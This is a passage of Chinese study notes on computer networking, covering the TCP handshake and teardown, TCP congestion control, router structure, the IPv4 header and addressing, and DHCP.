状态；</li><li>第三次握手：客户端收到 <code>SYN + ACK</code> 报文，向服务器发送确认包，客户端进入 <code>ESTABLISHED</code> 状态。待服务器收到客户端发送的 <code>ACK</code> 包也会进入 <code>ESTABLISHED</code> 状态，完成三次握手。</li></ul><p>第三次握手的作用可以从以下四个方面来理解：</p><p><strong>（一）确认双方的收发能力</strong></p><p>TCP 建立连接之前，需要确认客户端与服务器双方的收包和发包的能力。</p><ol><li><p>第一次握手：客户端发送网络包，服务端收到了。这样服务端就能得出结论：客户端的发送能力、服务端的接收能力是正常的。</p></li><li><p>第二次握手：服务端发包，客户端收到了。这样客户端就能得出结论：服务端的接收、发送能力，客户端的接收、发送能力是正常的。不过此时服务器并不能确认客户端的接收能力是否正常。</p></li><li><p>第三次握手：客户端发包，服务端收到了。这样服务端就能得出结论：客户端的接收、发送能力正常，服务器自己的发送、接收能力也正常。所以，只有三次握手才能确认双方的接收与发送能力是否正常。</p></li></ol><p><strong>（二）序列号可靠同步</strong></p><p>如果是两次握手，服务端无法确定客户端是否已经接收到了自己发送的初始序列号，如果第二次握手报文丢失，那么客户端就无法知道服务端的初始序列号，那 TCP 的可靠性就无从谈起。</p><p><strong>（三）阻止重复历史连接的初始化</strong></p><p>客户端由于某种原因发送了两个不同序号的 <code>SYN</code> 包，我们知道网络环境是复杂的，旧的数据包有可能先到达服务器。如果是两次握手，服务器收到旧的 <code>SYN</code> 就会立刻建立连接，那么会造成网络异常。</p><p>如果是三次握手，服务器需要回复 <code>SYN+ACK</code> 包，客户端会对比应答的序号，如果发现是旧的报文，就会给服务器发 <code>RST</code> 报文，直到正常的 <code>SYN</code> 到达服务器后才正常建立连接。</p><p>所以三次握手才有足够的上下文信息来判断当前连接是否是历史连接。</p><p><strong>（四）安全问题</strong></p><p>我们知道 TCP 新建连接时，内核会为连接分配一系列的内存资源，如果采用两次握手，就建立连接，那会放大 DDOS 攻击。</p><p>TCP 作为一种可靠传输控制协议，其核心思想：既要保证数据可靠传输，又要提高传输的效率，而三次握手恰好可以满足以上两方面的需求！</p></blockquote><p><strong>数据传输：</strong></p><p>一旦完成这 3 个步骤， 客户和服务器主机就可以相互发送包括数据的报文段了。 在以后每一个报文段中， SYN 比特都将被置为 0。</p><p><strong>断开连接：</strong></p><p>客户应用进程发出一个关闭连接命令。 这会引起客户 TCP 向服务器进程发送一个特殊的 TCP 报文段。这个特殊的报文段让其首部中的一个标志位即 FIN 比特 （ 参见图 3-29 ) 被设置为1。</p><p>当服务器接收到该报文段后， 就向发送方回送一个确认报文段。 然后， 服务器发送它自己的终止报文段， 其 FIN 比特被置为 1。 最后， 该客户对这个服务器的终止报文段进行确认。 此时， 在两台主机上用于该连接的所有资源都被释放了</p><p><img src="/posts/9d1d146e/image-20220407135231102.png" alt="image-20220407135231102"></p><p><img src="/posts/9d1d146e/image-20220407135318040.png" alt="image-20220407135318040"></p><p><img src="/posts/9d1d146e/image-20220407135325658.png" alt="image-20220407135325658"></p><blockquote><h2 id="3tcp协议释放连接时为什么要有四次挥手客户端向服务器发送ack为什么服务器能立即关闭客户端还要进行超时等待"><a class="markdownIt-Anchor" href="#3tcp协议释放连接时为什么要有四次挥手客户端向服务器发送ack为什么服务器能立即关闭客户端还要进行超时等待"></a> 3.TCP协议释放连接时，为什么要有四次挥手（客户端向服务器发送ACK），为什么服务器能立即关闭，客户端还要进行超时等待？</h2><p>四次挥手过程：</p><p><img src="/posts/9d1d146e/image-20220413204656848.png" alt="image-20220413204656848"></p><ul><li>第一次挥手。客户端发起 <code>FIN</code> 包（FIN = 1）,客户端进入 <code>FIN_WAIT_1</code> 状态。TCP 规定，即使 <code>FIN</code> 包不携带数据，也要消耗一个序号。</li><li>第二次挥手。服务器端收到 <code>FIN</code> 包，发出确认包 <code>ACK</code>（ack = u + 1），并带上自己的序号 seq=v，服务器端进入了 <code>CLOSE_WAIT</code> 状态。这个时候客户端已经没有数据要发送了，不过服务器端有数据发送的话，客户端依然需要接收。客户端接收到服务器端发送的 <code>ACK</code> 后，进入了 <code>FIN_WAIT_2</code> 状态。</li><li>第三次挥手。服务器端数据发送完毕后，向客户端发送 <code>FIN</code> 包（seq=w ack=u+1），半连接状态下服务器可能又发送了一些数据，假设发送 seq 为 w。服务器此时进入了 <code>LAST_ACK</code> 状态。</li><li>第四次挥手。客户端收到服务器的 <code>FIN</code> 包后，发出确认包（ACK=1，ack=w+1），此时客户端就进入了 <code>TIME_WAIT</code> 状态。注意此时 TCP 连接还没有释放，必须经过 <code>2*MSL</code> 后，才进入 <code>CLOSED</code> 状态。而服务器端收到客户端的确认包 <code>ACK</code> 后就进入了 <code>CLOSED</code> 状态，可以看出服务器端结束 TCP 连接的时间要比客户端早一些。</li></ul><blockquote><p><strong>四次挥手原因：</strong></p></blockquote><p>其实在 TCP 握手的时候，接收端发送 <code>SYN+ACK</code> 的包是将一个 <code>ACK</code> 和一个 <code>SYN</code> 合并到一个包中，所以减少了一次包的发送，三次完成握手。</p><p>对于四次挥手，因为 TCP 是全双工通信，在主动关闭方发送 FIN 包后，接收端可能还要发送数据，不能立即关闭服务器端到客户端的数据通道，所以也就不能将服务器端的 <code>FIN</code> 包与对客户端的 <code>ACK</code> 包合并发送，只能先确认<code>ACK</code>，只有当服务器的所有报文发送完毕之后，才发送<code>FIN</code>报文断开连接，因此需要四次挥手。</p><blockquote><p><strong>服务器能立即关闭，客户端还要进行超时等待？</strong></p></blockquote><p>有两个原因</p><ol><li><p>确认服务器已经收到客户端发送的<code>ACK</code></p><p>客户端要超时等待2*<code>MSL</code>，<code>MSL</code> 指的是报文在网络中最大生存时间。在客户端发送对服务器端的 <code>FIN</code> 的确认包 <code>ACK</code> 后，这个 <code>ACK</code> 包是有可能不可达的，服务器端如果收不到 <code>ACK</code> 的话需要重新发送 <code>FIN</code> 包。</p><p>所以客户端发送 <code>ACK</code> 后需要留出 <code>2MSL</code> 时间（ACK 到达服务器 + 服务器发送 FIN 重传包，一来一回）等待确认服务器端确实收到了 ACK 包。</p><p>也就是说客户端如果等待 <code>2MSL</code> 时间也没有收到服务器端的重传包 <code>FIN</code>，说明可以确认服务器已经收到客户端发送的 <code>ACK</code>。</p></li><li><p>避免新旧连接混淆。</p></li></ol><p>​在客户端发送完最后一个 <code>ACK</code> 报文段后，在经过 <code>2MSL</code> 时间，就可以使本连接持续的时间内所产生的所有报文都从网络中消失，使下一个新的连接不会出现这种旧的连接请求报文。</p><p>​有些自作主张的路由器会缓存 IP 数据包，如果连接重用了，那么这些延迟收到的包就有可能会跟新连接混在一起。</p></blockquote><h2 id="36-拥塞控制原理"><a class="markdownIt-Anchor" href="#36-拥塞控制原理"></a> 3.6 拥塞控制原理</h2><h3 id="361-拥塞原因与代价"><a class="markdownIt-Anchor" href="#361-拥塞原因与代价"></a> 3.6.1 拥塞原因与代价</h3><ol><li>当分组的到达速率接近链路容量时， 分组经历<strong>巨大的排队时延</strong></li><li>发送方<strong>必须执行重传</strong>以补偿因为缓存溢出而丢弃（ 丢失） 的分组</li><li>发送方在遇到大时延时所进行的<strong>不必要重传</strong>会引起路由器利用其链路带宽来转发不必要的分组副本</li><li>当分组丢失时, 任何用于传输该分组的上游传输能力都被浪费!</li></ol><h3 id="362-拥塞控制方法"><a class="markdownIt-Anchor" href="#362-拥塞控制方法"></a> 3.6.2 拥塞控制方法</h3><ul><li><p>端到端拥塞控制</p><p>不能从网络得到明确的反馈</p><p>从端系统根据观察到的时延和丢失现象推断出拥塞</p><p>这是TCP所采用的方法</p><ul><li>TCP 报文段的丢失 （ 通过超时或 3 次冗余确认而得知） 被认为是网络拥塞的一个迹象， TCP会相应地减小其窗口长度。</li><li>我们还将看到关于 TCP 拥塞控制的一些最新建议， 即使用增加的往返时延值作为网络拥塞程度增加的指示。</li></ul></li><li><p>网络辅助的拥塞控制</p><p>拥塞信息从网络反馈到发送方通常有两种方式：</p><ul><li><p>直接反馈信息可以由网络路由器发给发送方。 这种方式的通知通常采用了一种阻塞<br>分组 ( choke packet) 的形式（ 主要是说： “ 我拥塞了！ ” ）。</p></li><li><p>更为通用的第二种形式的通知是， 路由器标记或更新从发送方流向接收方的分组中的某个字段来指示拥塞的产生。 一旦收到一个标记的分组后， 接收方就会向发送方通知该网络拥塞指示。 注意到后一种形式的通知至少要经过一个完整的往返时间。</p></li></ul><p><img src="/posts/9d1d146e/image-20220426212443799.png" alt="image-20220426212443799"></p><p>路由器为端系统提供反馈</p><ul><li><p>一个bit指示一条链路出现拥塞(SNA,DECnet,TCP/IP ECN, ATM)</p></li><li><p>指示发送方按照一定速率发送</p></li></ul></li></ul><h2 id="37-tcp-拥塞控制"><a class="markdownIt-Anchor" href="#37-tcp-拥塞控制"></a> 3.7 TCP 拥塞控制</h2><p>TCP 的拥塞控制是： 每个 RTT 内 cwnd 线性 （ 加性） 增加 1MSS， 然后出现 3 个冗余ACK 事件时 cwnd 减半 （ 乘性减）。 因此， TCP 拥塞控制常常被称为<strong>加性增、 乘性减</strong>( Additive- Increase, Multiplicative- Decrease, <strong>AIMD</strong>) 拥塞控制方式。</p><blockquote><p>一个 TCP 发送方如何限制它向其连接发送流量的速率呢？</p></blockquote><p>运行在发送方的 TCP 拥塞控制机制跟踪一个额外的变量， 即<strong>拥塞窗口</strong>( congestion window )拥塞窗口表示为 cwnd ， 它对一个 TCP 发送方能向网络中发送流量的速率进行了限制。 特别是， 在一个发送方中未被确认的数据量不会超过 cwnd 与 rwnd 中的最小值， 即</p><p><img src="/posts/9d1d146e/image-20220426213308758.png" alt="image-20220426213308758"></p><p>发送方的发送速率大概是</p><p><img src="/posts/9d1d146e/image-20220426213345683.png" alt="image-20220426213345683"></p><blockquote><p>第二， 一个 TCP 发送方如何感知从它到目的地之间的路径上存在拥塞呢？</p></blockquote><p>丢失事件 = 超时<em>或者</em> 3个重复ACK</p><p>发生丢失事件后，TCP发送方降低速率(拥塞窗口)</p><p>TCP 使用确认来触发（ 或计时） 增大它的拥塞窗口长度， TCP 被说成是自计时 （ self- docking) 的。</p><blockquote><p>第三， 当发送方感知到端到端的拥塞时， 采用何种算法来改变其发送速率呢？</p></blockquote><ol><li><p><strong>慢启动</strong></p><p>当一条 TCP 连接开始时， <strong>cwnd 的值通常初始置为一个 MSS</strong> 的较小值,这就使得初始发送速率大约为 MSS/RTT。 例如， 如果 MSS = 500 字节且 RTT = 200ms， 则得到的初始发送速率大约只有 20kbps。</p><p>发送方对每个确认报文段将拥塞窗口增加一个 MSS，这一过程每过一个 RTT， 发送速率就翻番。 因此， TCP发送速率起始慢， 但在慢启动阶段以指数增长</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">cwnd=l MSS<br>ssthresh=<span class="hljs-number">64</span> KB<br>dupACKcount=<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><p>结束慢启动：</p><ul><li><p>第一种：</p><p>首先，如果存在一个由<strong>超时指示的丢包事件</strong>（即拥塞） ， TCP 发送方将 cwnd 设置为 1 并重新开始慢启动过程。 它还将第二个状态变量的值 ssthresh ( “ 慢启动阈值” 的速记）设置为 cwnd/2， 即当检测到拥塞时<strong>将 ssthresh 置为拥塞窗口值的一半</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">ssthresh=cwnd/<span class="hljs-number">2</span><br>cwnd=l MSS<br>dupACKcount=<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure></li><li><p>第二种：</p><p><strong>当 cwnd的值大于等于 ssthresh 时</strong>， 结束慢启动并且 TCP 转移到<strong>拥塞避免模式</strong></p></li><li><p>第三种：</p><p>如果<strong>检测到 3 个冗余 ACK</strong> ， 这时 TCP 执行一种快速重传并进人<strong>快速恢复状态</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">ssthresh=cwnd/<span class="hljs-number">2</span><br>cwnd=ssthresh+<span class="hljs-number">3.</span>MSS<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p><strong>拥塞避免</strong></p><p>一旦进入拥塞避免状态， cwnd 的值大约是上次遇到拥塞时的值的一半， 即距离拥塞可能并不遥远！ 因此， TCP 无法每过一个 RTT 再将 cwnd 的值翻番， 而是采用了一种较为保守的方法</p><p>超时后的保守机制：</p><p><strong>每个 RTT 只将 cwnd 的值增加一个 MSS（线性增长）</strong>。 这能够以几种方式完成。 一种通用的方法是对于 TCP 发送方无论何时到达一个新的确认， 就将 cwnd 增加一个MSS ( MSS/cwnd ) 字节。 例如， 如果 MSS 是 1460 字节并且 cwnd 是 14 600 字节， 则在一个 RTT 内发送 10 个报文段。 每个到达 ACK ( 假定每个报文段一个 ACK) 增加 1/10MSS的拥塞窗口长度， 因此在收到对所有 10 个报文段的确认后， 拥塞窗口的值将增加了一个 MSS</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cwnd=cwnd+MSS•(MSS/cwnd)<br>dupACKcount=<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><p>结束线性增长：</p><ul><li><p>出现超时丢包</p><p>cwnd 的值被设置为 1 个 MSS， 当丢包事件出现时， ssthresh 的值被更新为 cwnd 值的一半。重新开始慢启动。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">ssthresh=cwnd/<span class="hljs-number">2</span><br>cwnd=l MSS<br>dupACKcount=<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure></li><li><p>三个连续的ACK</p><p>TCP 将 cwnd 的值减半（ 为使测量结果更好， 计及已收到的 3 个冗余的ACK 要加上 3 个 MSS), 并且当收到 3 个冗余的 ACK, 将 ssthresh 的值记录为 cwnd 的值的<br>一半。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">ssthresh=cwnd/<span class="hljs-number">2</span><br>cwnd=ssthresh+<span class="hljs-number">3</span>*MSS<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p><strong>快速恢复</strong></p><p>在快速恢复中， 对于引起 TCP 进人快速恢复状态的缺失报文段， 对收到的每个冗余的ACK, cwnd 的值增加一个 MSS。</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">cwnd</span>=cwnd+MSS<br></code></pre></div></td></tr></table></figure><p>结束快速恢复：</p><ul><li><p>出现超时丢包</p><p>cwnd 的值被设置为 1 个 MSS， 当丢包事件出现时， ssthresh 的值被更新为 cwnd 值的一半。重新开始慢启动。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">ssthresh=cwnd/<span class="hljs-number">2</span><br>cwnd=l MSS<br>dupACKcount=<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure></li><li><p>当对丢失报文段的一个 ACK 到达时</p><p>TCP 在降低cwnd 后进入拥塞避免状态。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cwnd=ssthresh<br>dupACKcount=<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure></li></ul></li></ol><p><img src="/posts/9d1d146e/image-20220426214647713.png" alt="image-20220426214647713"></p><h2 id="38-小结"><a class="markdownIt-Anchor" href="#38-小结"></a> 3.8 小结</h2><p>RAP 网络更新</p><p>RAP优点缺点</p><p>子网划分</p><p>计算IP地址分配</p><p>数据包切片</p><h1 id="第4章-网络层"><a class="markdownIt-Anchor" href="#第4章-网络层"></a> 第4章 网络层</h1><h2 id="41-网络层概述"><a class="markdownIt-Anchor" href="#41-网络层概述"></a> 4.1 网络层概述</h2><p>每台路由器的数据平面的主要作用是从其输入链路向其输岀链路转发数据报；</p><p>控制平面的主要作用是协调这些本地的每路由器转发动作， 使得数据报沿着源和目的地主机之间的路由器路径最终进行端到端传送。</p><p>网络层的作用：将分组从一台发送主机移动到一台接收主机。</p><h3 id="411-转发和路由选择数据平面和控制平面"><a class="markdownIt-Anchor" href="#411-转发和路由选择数据平面和控制平面"></a> 4.1.1 转发和路由选择：数据平面和控制平面</h3><p><strong>两种重要的网络层功能：</strong></p><ul><li>转发。 当一个分组到达某路由器的一条输入链路时， 该路由器必须将该分组移动到适当的输出链路。</li><li>路由选择。 当分组从发送方流向接收方时， 网络层必须决定这些分组所采用的路由或路径。 计算这些路径的算法被称为路由选择算法（ muting algorithm)</li></ul><p><img src="/posts/9d1d146e/image-20220603093830226.png" alt="image-20220603093830226"></p><h3 id="412-网络服务模型"><a class="markdownIt-Anchor" href="#412-网络服务模型"></a> 4.1.2 网络服务模型</h3><p>网络服务模型 ( network service model ) 定义了分组在发送与接收端系统之间的端到端运输特性。</p><h2 id="42-虚电路和数据报网络"><a class="markdownIt-Anchor" href="#42-虚电路和数据报网络"></a> 4.2 虚电路和数据报网络</h2><p>网络层为接在网络上的主机所提供的服务可以有两大类</p><ul><li><p>无连接的网络服务（数据报服务）</p></li><li><p>面向连接的网络服务（虚电路服务）</p></li></ul><h3 id="421-虚电路"><a class="markdownIt-Anchor" href="#421-虚电路"></a> 4.2.1 虚电路</h3><p><img src="/posts/9d1d146e/image-20220613131928207.png" alt="image-20220613131928207"></p><ul><li>数据传输前，需建立连接，一个连接被称为一条虚电路VC</li><li>虚电路由VC号来标识和区分</li><li>虚电路连接的状态需要维持（路径上的交换节点都参与）</li><li>虚电路连接涉及资源预留问题</li></ul><p><img src="/posts/9d1d146e/image-20220613132209227.png" alt="image-20220613132209227"></p><p>虚电路的三个阶段</p><ul><li>虚电路建立（信令协议控制）</li><li>数据传输</li><li>虚电路拆除（信令协议控制）</li></ul><p><img src="/posts/9d1d146e/image-20220613132243130.png" alt="image-20220613132243130"></p><h3 id="422-数据报网络"><a class="markdownIt-Anchor" href="#422-数据报网络"></a> 4.2.2 数据报网络</h3><ul><li><p>在网络层无呼叫建立</p></li><li><p>路由器：没有端到端连接的状态</p><ul><li>无网络级“连接”的概念</li></ul></li><li><p>分组使用目的主机地址转发</p><ul><li>在相同源和目的对可能采用不同的路径</li></ul></li></ul><p><img src="/posts/9d1d146e/image-20220613132414507.png" alt="image-20220613132414507"></p><p><img src="/posts/9d1d146e/image-20220613132545397.png" alt="image-20220613132545397"></p><h2 id="43-路由器构成"><a class="markdownIt-Anchor" href="#43-路由器构成"></a> 4.3 路由器构成</h2><p><strong>路由器的主要功能:</strong></p><ul><li>运行路由算法以得到转发表</li><li>根据转发表对IP分组进行转发</li><li>提供多种网络类型接口，完成不同网络的互联</li></ul><p>分组交换机是指一台通用分组交换设备， 它根据分组首部字段中的值， 从输入链路接口到输出链路接口转移分组。</p><ul><li>某些分组交换机称为<strong>链路层交换机</strong> ( link- layer switch )( 在第 6 章仔细学习） ， 基于链路层帧中的字段值做出转发决定， 这些交换机因此被称为链路层 （ 第 2 层） 设备。</li><li>其他分组交换机称为<strong>路由器</strong>（ router)， 基于网络层数据报中的首部字段值做出转发决定。 路由器因此是网络层（ 第 3 层） 设备。</li></ul><p><img src="/posts/9d1d146e/image-20220603100424629.png" alt="image-20220603100424629"></p><ul><li><p><strong>输入端口</strong>。 输入端口（ input port ) 执行几项重要功能。</p><p><img src="/posts/9d1d146e/image-20220613132941437.png" alt="image-20220613132941437"></p><ul><li>执行终结入物理链路的物理层功能， 这显示在图 4-4 中输入端口部分最左侧的方框与输出端口部分最右侧的方框中。</li><li>与位于入链路远端的数据链路层交互来执行数据链路层功能， 这显示在输入与输出端口部分中间的方框中。</li><li>执行查找功能， 这显示在输入端口最右侧的方框中。  通过査询转发表决定路由器的输出端口， 到达的分组通过路由器的交换结构转发到输出端口。</li></ul></li><li><p><strong>交换结构</strong>。 交换结构将路由器的输入端口连接到它的输出端口。 这种交换结构完全包含在路由器之中， 即它是一个网络路由器中的网络！</p></li><li><p><strong>输出端口</strong>。 输出端口存储从交换结构接收的分组， 并通过执行必要的链路层和物理层功能在输出链路上传输这些分组。 当一条链路是双向的时（ 即承载两个方向的流量） ， 输出端口通常与该链路的输入端口成对出现在同一线路卡上。</p><p><img src="/posts/9d1d146e/image-20220613132954585.png" alt="image-20220613132954585"></p></li><li><p><strong>路由选择处理器</strong>。 路由选择处理器执行控制平面功能。 在传统的路由器中， 它执行路由选择协议（ 我们将在 5.3 节和 5.4 节学习） ， 维护路由选择表与关联链路状态信息， 并为该路由器计算转发表。 在 SDN 路由器中， 路由选择处理器（ 在其他活动中） 负责与远程控制器通信， 目的是接收由远程控制器计算的转发表项， 并在该路由器的输人端口安装这些表项。 路由选择处理器还执行网络管理功能， 我们将在5.7 节学习相关内容</p></li></ul><h3 id="431-输入端口处理和基于目的地转发"><a class="markdownIt-Anchor" href="#431-输入端口处理和基于目的地转发"></a> 4.3.1 输入端口处理和基于目的地转发</h3><p>输入端口的线路端接功能与链路层处理实现了用于各个输人链路的物理层和链路层。</p><p>在输入端口中执行的査找对于路由器运行是至关重要的,路由器使用转发表来查找输岀端口， 使得到达的分组能经过交换结构转发到该输出端口。</p><p><img src="/posts/9d1d146e/image-20220603102722618.png" alt="image-20220603102722618"></p><p><img src="/posts/9d1d146e/image-20220603105048161.png" alt="image-20220603105048161"></p><p>路由器用分组目的地址的前缀 ( prefix) 与该表中的表项进<br>行匹配； 如果存在一个匹配项， 则路由器向与该匹配项相关联的链路转发分组。</p><p>当有多个匹配时， 该路由器使用<strong>D</strong> ( longest prefix matching rule)； 即在该表中寻找最长的匹配项， 并向与最长前缀匹配相关联的链路接口转发分组。</p><h3 id="432-交换"><a class="markdownIt-Anchor" href="#432-交换"></a> 4.3.2 交换</h3><p><img src="/posts/9d1d146e/image-20220603105411092.png" alt="image-20220603105411092"></p><ul><li><p>经内存交换</p><ul><li><p>具有交换功能的传统计算机，在CPU的直接控制下</p></li><li><p>分组拷贝到系统的内存</p></li><li><p>速率受内存带宽限制(每数据报跨越两次总线)</p></li></ul></li><li><p>经总线交换</p><ul><li><p>数据报从输入端口到输出端口内存经一个共享的总线（总线芯片），总线速度快于内存读取速度</p></li><li><p>总线竞争: 任何时刻，总线仅能连通1个输入和1个输出，数据转发速率受总线带宽限制</p></li><li><p>1 Gbps总线, Cisco 1900: 用于接入和企业(非区域或主干)路由器的充足速率</p></li></ul></li><li><p>经互联网络的交换</p><ul><li><p>克服了总线带宽限制</p></li><li><p>Crossbar一般同时满足多个输入和输出连通</p></li><li><p>一般是路由交换机</p></li><li><p>Cisco 12000: 通过互联网络交换提供60Gbps</p></li></ul></li></ul><h3 id="433-输出端口处理"><a class="markdownIt-Anchor" href="#433-输出端口处理"></a> 4.3.3 输出端口处理</h3><p><img src="/posts/9d1d146e/image-20220603105748253.png" alt="image-20220603105748253"></p><h2 id="44-网际协议ipv4-寻址-ipv6及其他"><a class="markdownIt-Anchor" href="#44-网际协议ipv4-寻址-ipv6及其他"></a> 4.4 网际协议：IPv4、寻址、IPv6及其他</h2><h3 id="441-ipv4数据报格式"><a class="markdownIt-Anchor" href="#441-ipv4数据报格式"></a> 4.4.1 IPv4数据报格式</h3><p><img src="/posts/9d1d146e/image-20220603110855556.png" alt="image-20220603110855556"></p><ul><li>版 本（ 号）。 这 4 比特规定了数据报的 IP 协议版本。 通过査看版本号， 路由器能够确定如何解释 IP 数据报的剩余部分。 不同的 IP 版本使用不同的数据报格式。</li><li>首 部 长 度。 因为一个 IPv4 数据报可包含一些可变数量的选项（ 这些选项包括IPv4 数据报首部中） ， 故需要用这 4 比特来确定 IP 数据报中载荷（ 例如在这个数 据报中被封装的运输层报文段） 实际开始的地方。<strong>单位是4字节</strong>。 大多数 IP 数据报不包含选项，所以一般的 IP 数据报具有 20 字节的首部</li><li>服务类型。 服务类型（ TOS) 比特包含在 IPv4 首部中， 以便使不同类型的 IP 数据报 （ 例如， 一些特别要求低时延、 高吞吐量或可靠性的数据报） 能相互区别开来。 例如， 将实时数据报 （ 如用于 1P 电话应用） 与非实时流量 （如 FTP) 区分开也许是有用的。</li><li>数 据 报 长 度。 这是 IP 数据报的总长度（ 首部加上数据） ， <strong>单位是字节</strong>。 因为该字段长为 16 比特， 所以 IP数据报的理论最大长度为 65 535 字节。 然而， 数据报很少有超过 1500 字节的，该长度使得 IP 数据报能容纳最大长度以太网帧的载荷字段</li><li>标 识：占16位，是一个计数器，每产生一个数据报就加1，数据报分片时，每一个数据报片都复制一遍标识号。</li><li>标 志：占3位，最后一位MF=1是表示后面还有分片，MF=0时表示最后一个分片</li><li>片 偏 移。 以八个字节为偏移单位，除最后一个分片外，每个分片长度必须是8B的整数倍。</li><li>寿命。 寿命 ( Time- To- Uve , TTL ) 字段用来确保数据报不会永远 （ 如由于长时间的路由选择环路） 在网络中循环。 毎当一台路由器处理数据报时， 该字段的值减1。 若TTL字段减为0,则该数据报必须丢弃。</li><li>协议。 该字段通常仅当一个 IP 数据报到达其最终目的地时才会有用。 该字段值指示了 IP 数据报的数据部分应交给哪个特定的运输层协议。 例如， 值为 6 表明数据部分要交给 TCP, 而值为 17 表明数据要交给 UDP。</li><li>首部检验和。 首部检验和用于帮助路由器检测收到的 IP 数据报中的比特错误。 首部检验和是这样计算的： 将首部中的每 2 个字节当作一个数， 用反码算术对这些数求和。</li><li>源和目的 IP 地 址。 当某源生成一个数据报时， 它在源 IP 字段中插人它的 IP 地址， 在目的 IP 地址字段中插入其最终目的地的地址。 通常源主机通过 DNS 査找来决定目的地址</li><li>选 项。 选项字段允许 IP 首部被扩展。在 IPv6 首部中已去掉了 IP 选项</li><li>数据（ 有效载荷）。 我们来看看最后也是最重要的字段， 这是数据报存在的首要理由！ 在大多数情况下， IP 数据报中的数据字段包含要交付给目的地的运输层报文段（ TCP 或 UDP)。 然而， 该数据字段也可承载其他类型的数据， 如 ICMP 报文( 在 5.6 节中讨论）。</li></ul><h3 id="442-ipv4数据报分片"><a class="markdownIt-Anchor" href="#442-ipv4数据报分片"></a> 4.4.2 IPv4数据报分片</h3><p><img src="/posts/9d1d146e/image-20220605113500345.png" alt="image-20220605113500345"></p><h3 id="443-ipv4编址"><a class="markdownIt-Anchor" href="#443-ipv4编址"></a> 4.4.3 IPv4编址</h3><p>互联这3个主机接口与 1 个路由器接口的网络形成一个子网</p><p>两级IP地址:</p><ul><li><p>子网部分，网络号，网络前缀(高阶比特)</p></li><li><p>主机部分，主机号(低阶比特)</p></li></ul><p>子网：</p><ul><li><p>IP地址具有相同的子网部分的设备接口（具有共同的IP地址前缀）</p></li><li><p>无需通过路由器就能够物理上互相到达</p></li></ul><p>IP 编址为这个子网分配一个地址 223.1.1.0/24, 其中的/24 记法， 有时称为<strong>子网掩码</strong>（ network mask ), 指示 32 比特中的最左侧 24 比特 定义了子网地址。 因此子网223.1.1.0/24 由 3 个主机接口（ 223.1.1.1 、 223.1.1.2和 223.1.1 . 3 ) 和 1 个 路 由 器 接 口(223.1.1.4 ) 组成。</p><p><img src="/posts/9d1d146e/image-20220605114842068.png" alt="image-20220605114842068"></p><p><img src="/posts/9d1d146e/image-20220613134559429.png" alt="image-20220613134559429"></p><p><img src="/posts/9d1d146e/image-20220613134813517.png" alt="image-20220613134813517"></p><p>如何得到一个IP地址：</p><ol><li><p>获取一块地址</p><ul><li>从一个 ISP 获取一组地址</li><li>供 ISP 本身得到一块地址–一个全球性的权威机构:ICANN</li></ul></li><li><p>获取主机地址： 动态主机配置协议</p><p>DHCP 允许主机自动获取（ 被分配） 一个 IP 地址。 网络管理员能够配置 DHCP， 以使某给定主机每次与网络连接时能得到一个相同的 IP 地址， 或者某主机将被分配一个临时的 IP 地址（ temporary IP address)， 每次与网络连接时该地址也许是不同的。</p><p>除了主机 IP 地址分配外， DHCP 还允许一台主机得知其他信息， 例如它的子网掩码、 它的第一跳路由器地址 （ 常称为默认网关） 与它的本地DNS 服务器的地址。</p><p><strong>即插即用协议 （ plug-and- play protocol ) 或 零 配 置 （ zeroconf ) 协议</strong></p><p>DHCP 协议是一个 4 个步骤的过程</p><ul><li><p><strong>DHCP服务器发现</strong>： 0.0.0.0——&gt;255.255.255.255</p><p>一台新到达的主机的首要任务是发现一个要与其交互的 DHCP服务器。 这可通过使用 DHCP 发现报文 ( DHCP discover message) 来完成， 客户在UDP 分组中向端口 67 发送该发现报文。</p></li></ul></li></ol><p>DHCP 客户生成包含 DHCP 发现报文的IP 数据报， 其中使用广播目的地址 255.255. 255. 255 并且使用“ 本主机” 源 IP 地址0.0. 0.0。DHCP 客户将该 1P 数据报传递给链路层， 链路层然后将该帧广播到所有与该子网连接的节点。</p><ul><li><p><strong>DHCP服务器提供</strong>： a.b.c.d——&gt;255.255.255.255</p><p>DHCP 服务器收到一个 DHCP 发现报文时， 用 DHCP 提供报文 （ DHCP offer message) 